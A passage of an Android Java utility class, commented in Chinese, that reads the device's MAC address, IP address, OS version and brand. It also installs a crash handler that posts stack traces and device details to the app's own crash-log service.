     * 获取MAC地址
     *
     * @param context
     * @return
     */
    public static String getMacAddress(Context context) {
        String mac = "02:00:00:00:00:00";
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            mac = getMacDefault(context);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            mac = getMacAddress();
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            mac = getMacFromHardware();
        }
        return mac;
    }


    /**
     * Android  6.0 之前（不包括6.0）
     * 必须的权限  <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     *
     * @param context
     * @return
     */
    private static String getMacDefault(Context context) {
        String mac = "02:00:00:00:00:00";
        if (context == null) {
            return mac;
        }

        WifiManager wifi = (WifiManager) context.getApplicationContext()
                .getSystemService(Context.WIFI_SERVICE);
        if (wifi == null) {
            return mac;
        }
        WifiInfo info = null;
        try {
            info = wifi.getConnectionInfo();
        } catch (Exception e) {
        }
        if (info == null) {
            return null;
        }
        mac = info.getMacAddress();
        if (!TextUtils.isEmpty(mac)) {
            mac = mac.toUpperCase(Locale.ENGLISH);
        }
        return mac;
    }


    /**
     * Android 6.0（包括） - Android 7.0（不包括）
     *
     * @return
     */
    private static String getMacAddress() {
        String WifiAddress = "02:00:00:00:00:00";
        try {
            WifiAddress = new BufferedReader(new FileReader(new File("/sys/class/net/wlan0/address"))).readLine();
        } catch (IOException e) {
            e.printStackTrace();
            Log.e("regus", " getMacAddress-> " + e.getLocalizedMessage());
        }
        return WifiAddress;
    }


    /**
     * 7.0 以后
     * 遍历循环所有的网络接口，找到接口是 wlan0
     * 必须的权限 <uses-permission android:name="android.permission.INTERNET" />
     *
     * @return
     */
    private static String getMacFromHardware() {
        try {
            List<NetworkInterface> all = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface nif : all) {
                if (!nif.getName().equalsIgnoreCase("wlan0")) continue;

                byte[] macBytes = nif.getHardwareAddress();
                if (macBytes == null) {
                    return "";
                }

                StringBuilder res1 = new StringBuilder();
                for (byte b : macBytes) {
                    res1.append(String.format("%02X:", b));
                }

                if (res1.length() > 0) {
                    res1.deleteCharAt(res1.length() - 1);
                }
                return res1.toString();
            }
        } catch (Exception e) {
            Log.e("regus", " getMacFromHardware-> " + e.getLocalizedMessage());
            e.printStackTrace();
        }
        return "02:00:00:00:00:00";
    }


    /**
     * 获取ip地址
     *
     * @param context
     * @return
     */

    public static String getIPAddress(Context context) {
        NetworkInfo info = ((ConnectivityManager) context
                .getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo();
        if (info != null && info.isConnected()) {
            if (info.getType() == ConnectivityManager.TYPE_MOBILE) {    // 当前使用2G/3G/4G网络
                try {
                    for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); ) {
                        NetworkInterface intf = en.nextElement();
                        for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements(); ) {
                            InetAddress inetAddress = enumIpAddr.nextElement();
                            if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
                                return inetAddress.getHostAddress();
                            }
                        }
                    }
                } catch (SocketException e) {
                    e.printStackTrace();
                    Log.e("regus", " getIPAddress-> " + e.getLocalizedMessage());
                }

            } else if (info.getType() == ConnectivityManager.TYPE_WIFI) {    // 当前使用无线网络
                WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                String ipAddress = intIP2StringIP(wifiInfo.getIpAddress());    // 得到IPV4地址
                return ipAddress;
            }
        }
        return "";
    }

    /**
     * 将得到的int类型的IP转换为String类型
     *
     * @param ip
     * @return
     */
    public static String intIP2StringIP(int ip) {
        return (ip & 0xFF) + "." +
                ((ip >> 8) & 0xFF) + "." +
                ((ip >> 16) & 0xFF) + "." +
                (ip >> 24 & 0xFF);
    }


    /**
     * 获取当前手机系统版本号
     *
     * @return 系统版本号
     */
    public static String getSystemInfo() {

        String handSetInfo =
                " android " + android.os.Build.VERSION.RELEASE +
                        "  /  " + android.os.Build.MODEL;

        Log.e("regus", "手机信息 " + handSetInfo);

        return handSetInfo;
    }


    /**
     * 获取手机厂商
     *
     * @return 手机厂商
     */
    public static String getDeviceBrand() {
        return android.os.Build.BRAND;
    }


    /**
     * crash 相关
     */


    private static class CrashHandler implements Thread.UncaughtExceptionHandler {

        public static final String TAG = "CrashHandler";


        private String host;

        //设备相关

        private String macAddress = "";
        private String phoneNum = "";
        private String ip = "";
        private String sysInfo = "";

        private String aid = "";
        private String sid = "";


        //系统默认的UncaughtException处理类
        private Thread.UncaughtExceptionHandler mDefaultHandler;
        //CrashHandler实例
        private static CrashHandler INSTANCE = new CrashHandler();
        //程序的Context对象
        private Context mContext;
        //用来存储设备信息和异常信息
        private Map<String, String> infos = new HashMap<String, String>();

        //用于格式化日期,作为日志文件名的一部分
        private DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss");

        /**
         * 保证只有一个CrashHandler实例
         */
        private CrashHandler() {
        }

        /**
         * 获取CrashHandler实例 ,单例模式
         */
        public static CrashHandler getInstance() {
            return INSTANCE;
        }

        /**
         * 初始化
         *
         * @param context
         */
        public void init(Context context) {
            mContext = context;
            //获取系统默认的UncaughtException处理器
            mDefaultHandler = Thread.getDefaultUncaughtExceptionHandler();
            //设置该CrashHandler为程序的默认处理器
            Thread.setDefaultUncaughtExceptionHandler(this);
        }

        public void setData(String host, String macAddress, String phoneNum, String ip, String sysInfo, String aid, String sid) {
            this.host = host;
            this.macAddress = macAddress;
            this.phoneNum = phoneNum;
            this.ip = ip;
            this.sysInfo = sysInfo;
            this.aid = aid;
            this.sid = sid;

            Log.e("regus", " crash SetData macAddress: " + macAddress + " phoneNum: " + phoneNum + " ip: " + ip + " sysInfo: " + sysInfo);
        }


        /**
         * 当UncaughtException发生时会转入该函数来处理
         */
        @Override
        public void uncaughtException(Thread thread, Throwable ex) {


            handleException(ex);

            try {
                Thread.sleep(2000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(0);


        }

        /**
         * 自定义错误处理,收集错误信息 发送错误报告等操作均在此完成.
         *
         * @param ex
         * @return true:如果处理了该异常信息;否则返回false.
         */
        private boolean handleException(Throwable ex) {
            if (ex == null) {
                return false;
            }
            //收集设备参数信息
            collectDeviceInfo(mContext);
            //保存日志文件
            saveCrashInfo2File(ex);
            return true;
        }

        /**
         * 收集设备参数信息
         *
         * @param ctx
         */
        public void collectDeviceInfo(Context ctx) {
            try {
                PackageManager pm = ctx.getPackageManager();
                PackageInfo pi = pm.getPackageInfo(ctx.getPackageName(), PackageManager.GET_ACTIVITIES);
                if (pi != null) {
                    String versionName = pi.versionName == null ? "null" : pi.versionName;
                    String versionCode = pi.versionCode + "";
                    infos.put("versionName", versionName);
                    infos.put("versionCode", versionCode);

                }
            } catch (PackageManager.NameNotFoundException e) {

            }
            Field[] fields = Build.class.getDeclaredFields();
            for (Field field : fields) {
                try {
                    field.setAccessible(true);
                    infos.put(field.getName(), field.get(null).toString());
                } catch (Exception e) {
                }
            }
        }

        /**
         * 保存错误信息到文件中
         *
         * @param ex
         * @return 返回文件名称, 便于将文件传送到服务器
         */
        private String saveCrashInfo2File(Throwable ex) {

            StringBuffer sb = new StringBuffer();
            for (Map.Entry<String, String> entry : infos.entrySet()) {
                String key = entry.getKey();
                String value = entry.getValue();
                sb.append(key + "=" + value + "\n");
            }

            Writer writer = new StringWriter();
            PrintWriter printWriter = new PrintWriter(writer);
            ex.printStackTrace(printWriter);
            Throwable cause = ex.getCause();
            while (cause != null) {
                cause.printStackTrace(printWriter);
                cause = cause.getCause();
            }
            printWriter.close();
            String result = writer.toString();
            sb.append(result);


            //上传 crash

            new Thread(new PostCrashInfoRunnable(sb.toString())).start();

            return null;
        }


        private class PostCrashInfoRunnable implements Runnable {


            String LogContent;

            public PostCrashInfoRunnable(String logContent) {
                LogContent = logContent;
            }


            @Override

            public void run() {


                String rootUrl = "http://" + host + "/AppShellService.svc/AddCrashLog";

                Log.e("regus_", "请求的crash 上传接口 " + rootUrl);


                try {

                    JSONObject body = new JSONObject();
                    body.put("Mac", macAddress);
                    body.put("Ip", ip);
                    body.put("OsVersion", sysInfo);
                    body.put("Mobile", phoneNum);
                    body.put("AppId", aid);
                    body.put("StoreId", sid);
                    body.put("LogContent", LogContent);

                    Log.e("regus_", "闪退文本格式: " + LogContent);

                    URL urll = new URL(rootUrl);
                    HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                    urlConnection.setConnectTimeout(5000);
                    urlConnection.setReadTimeout(5000);
                    urlConnection.setRequestMethod("POST");
                    // 设置contentType
                    urlConnection.setRequestProperty("Content-Type", "application/json");
                    // 设置允许输出
                    urlConnection.setDoOutput(true);
                    urlConnection.setDoInput(true);
                    urlConnection.connect();


                    DataOutputStream os = new DataOutputStream(urlConnection.getOutputStream());
                    String content = String.valueOf(body);
                    os.writeBytes(content);
                    os.flush();
                    os.close();


                    int code = urlConnection.getResponseCode();
                    if (code == 200) {

                        InputStream inputStream = urlConnection.getInputStream();
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                        String line;
                        StringBuffer buffer = new StringBuffer();
                        while ((line = bufferedReader.readLine()) != null) {
                            buffer.append(line);
                        }
                        String jsonStr = buffer.toString();
                        Log.e("regus_crash接口返回", jsonStr + "");

                        JSONObject responseJson = new JSONObject(jsonStr.replace("\\", ""));

                        if (responseJson.has("Status") && responseJson.has("Data")) {

                            if (responseJson.getBoolean("Data")) {
                                Log.e("regus ", "闪退上传成功");
                            }

                        }

                    }
                } catch (Exception e) {
                    Log.e("reugs", "crash接口 " + e.getLocalizedMessage());
                }

            }


        }


    }


}
